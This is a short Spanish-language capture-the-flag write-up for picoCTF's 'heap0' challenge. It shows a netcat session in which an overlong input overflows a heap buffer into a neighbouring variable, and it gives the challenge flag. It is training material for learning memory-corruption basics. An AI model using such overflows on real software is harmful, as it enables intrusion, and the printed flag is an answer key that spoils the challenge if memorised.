## Objetivo
Are overflows just a stack concern?Download the binary [here](https://artifacts.picoctf.net/c_tethys/15/chall).Download the source [here](https://artifacts.picoctf.net/c_tethys/15/chall.c).

Additional details will be available after launching your challenge instance.
## Solución


Escribí en el bufer
```
christianlamas-picoctf@webshell:~$ nc tethys.picoctf.net 63455

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x561dd2a0e2b0  ->   pico
+-------------+----------------+
[*]   0x561dd2a0e2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: bandera

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x561dd2a0e2b0  ->   bandera
+-------------+----------------+
[*]   0x561dd2a0e2d0  ->   bico
+-------------+----------------+

```
Agregue una cadena demasiado grande para causar un desbordamiento para cambiar donde dice bico con otra cadena 
```
1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: asdasdasdasdasdasdasdasdasdsadasdasdasdsdasdasdasd

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x561dd2a0e2b0  ->   asdasdasdasdasdasdasdasdasdsadasdasdasdsdasdasdasd
+-------------+----------------+
[*]   0x561dd2a0e2d0  ->   dasdasdsdasdasdasd
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_0c473fe8}
^C
christianlamas-picoctf@webshell:~$ 
```
Al realizarlo se cambio y al pedir la bandera este nos da la bandera si no se cambiaba bico este no nos muestra la bandera.

Bandera: picoCTF{my_first_heap_overflow_0c473fe8}
## Notas adicionales

## Referencias